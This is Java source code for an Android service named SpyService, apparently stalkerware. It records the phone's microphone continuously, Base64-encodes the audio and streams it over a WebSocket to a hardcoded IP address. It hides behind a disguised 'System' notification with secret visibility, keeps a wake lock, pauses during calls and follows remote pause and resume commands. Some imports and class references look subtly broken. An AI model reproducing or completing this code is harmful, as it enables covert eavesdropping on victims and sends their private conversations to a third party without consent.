package com.system.phantom;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import com.squareup.okhttp3.OkHttpClient;
import com.squareup.okhttp3.Request;
import com.squareup.okhttp3.WebSocket;
import com.squareup.okhttp3.WebSocketListener;

import android.util.Base64;

import java.util.concurrent.TimeUnit;

public class SpyService extends Service {
    private static final String WS_URL = "ws://100.110.145.108:5000/ws?device_id=";
    private OkHttpClient client;
    private WebSocket webSocket;
    private Handler handler = new Handler();
    private String deviceId;
    private AudioRecord audioRecord;
    private boolean isRecording = false;
    private Thread audioThread;
    private TelephonyManager telephonyManager;
    private boolean isCallActive = false;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PhantomLock");
        wakeLock.acquire(10 * 60 * 1000L);
        startForeground(9999, createNotification());
        initWebSocket();
        telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        telephonyManager.listen(new TelephonyManager.PhoneStateListener() {
            @Override
            public void onCallStateChanged(int state, String incomingNumber) {
                if (state == TelephonyManager.CALL_STATE_IDLE) {
                    isCallActive = false;
                    if (!isRecording) startAudioStreaming();
                } else {
                    isCallActive = true;
                    if (isRecording) stopAudioStreaming();
                }
            }
        }, TelephonyManager.PHONE_STATE_LISTEN_CALL_STATE);
        startAudioStreaming();
        Intent intent = new Intent(this, PermissionHelper.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void initWebSocket() {
        client = new OkHttpClient.Builder().pingInterval(10, TimeUnit.SECONDS).build();
        Request request = new Request.Builder().url(WS_URL + deviceId).build();
        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, okhttp3.Response response) {
                webSocket.send("REGISTER|" + deviceId + "|" + Build.MODEL);
            }
            @Override
            public void onMessage(WebSocket webSocket, String text) {
                if (text.startsWith("MIC_PAUSE")) stopAudioStreaming();
                else if (text.startsWith("MIC_RESUME")) startAudioStreaming();
            }
            @Override
            public void onFailure(WebSocket webSocket, Throwable t, okhttp3.Response response) {
                handler.postDelayed(() -> initWebSocket(), 5000);
            }
        });
    }

    private void sendWebSocket(String msg) { if (webSocket != null) webSocket.send(msg); }

    private void startAudioStreaming() {
        if (isRecording || isCallActive) return;
        int bufferSize = AudioRecord.getMinBufferSize(8000, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, 8000, AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT, bufferSize * 2);
        isRecording = true;
        audioThread = new Thread(() -> {
            byte[] buffer = new byte[bufferSize];
            while (isRecording) {
                int read = audioRecord.read(buffer, 0, buffer.length);
                if (read > 0) {
                    String b64 = Base64.encodeToString(buffer, 0, read, Base64.NO_WRAP);
                    sendWebSocket("AUDIO|" + b64);
                }
                try { Thread.sleep(50); } catch (Exception e) {}
            }
        });
        audioRecord.startRecording();
        audioThread.start();
    }

    private void stopAudioStreaming() {
        isRecording = false;
        if (audioThread != null) audioThread.interrupt();
        if (audioRecord != null) { audioRecord.stop(); audioRecord.release(); }
    }

    private Notification createNotification() {
        String channelId = "phantom_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_LOW);
            channel.setShowBadge(false);
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);
        }
        return new Notification.Builder(this, channelId)
                .setContentTitle("System")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_MIN)
                .setVisibility(Notification.VISIBILITY_SECRET)
                .build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopAudioStreaming();
        if (webSocket != null) webSocket.close(1000, "Service stopped");
    }
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
